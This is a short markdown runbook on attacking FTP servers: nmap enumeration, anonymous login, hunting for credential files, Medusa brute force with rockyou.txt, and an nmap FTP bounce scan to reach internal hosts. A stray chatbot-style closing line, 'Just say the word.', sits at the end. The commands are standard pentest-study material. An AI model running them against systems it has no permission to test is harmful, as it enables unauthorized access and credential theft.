# Attacking FTP – Quick Runbook

---

## Service Info
- Protocol: FTP
- Port: TCP/21
- Common use: File transfer, web/dev pipelines
- High-risk if misconfigured (anon, write access)

---

## 1. Enumeration

### Nmap
```bash
nmap -sC -sV -p 21 <IP>
````

Key findings:

* `ftp-anon` → anonymous login
* Banner → service/version (e.g. vsFTPd 2.3.4)

List all anon files:

```bash
nmap -p 21 --script ftp-anon --script-args ftp-anon.maxlist=-1 <IP>
```

---

## 2. Anonymous Login (Common Misconfig)

```bash
ftp <IP>
Name: anonymous
Password: <blank>
```

Useful FTP commands:

```text
ls        # list files
cd        # change directory
get       # download file
mget      # download multiple files
put       # upload file
mput      # upload multiple files
help
```

⚠️ If **write access** exists → possible webshell / pivot

---

## 3. Sensitive File Hunting

Look for:

* `.txt`, `.bak`, `.conf`
* Credentials
* Web roots (`/var/www`, `/htdocs`)
* Upload directories (`incoming/`, `pub/`)

---

## 4. Brute Force (If No Anon)

⚠️ Use sparingly — prefer password spraying

### Medusa

```bash
medusa -u <user> -P rockyou.txt -h <IP> -M ftp
```

User list:

```bash
medusa -U users.txt -P passwords.txt -h <IP> -M ftp
```

---

## 5. FTP Bounce Attack (Pivoting)

Use FTP server as a proxy to scan internal hosts.

### Nmap Bounce Scan

```bash
nmap -Pn -n -v -p80 -b anonymous:password@<FTP_IP> <INTERNAL_IP>
```

Works only if:

* FTP allows PORT commands
* Bounce protection disabled

---

## 6. Common Vulnerabilities

* Anonymous read/write
* Weak credentials
* Outdated FTP versions (e.g. vsFTPd 2.3.4)
* FTP Bounce misconfiguration

---

## 7. Attack Flow (Recommended)

1️⃣ `nmap -sC -sV -p 21`
2️⃣ Try anonymous login
3️⃣ Enumerate + download files
4️⃣ Check write access
5️⃣ Brute force (last resort)
6️⃣ Bounce scan (pivot)

---



Just say the word.
```
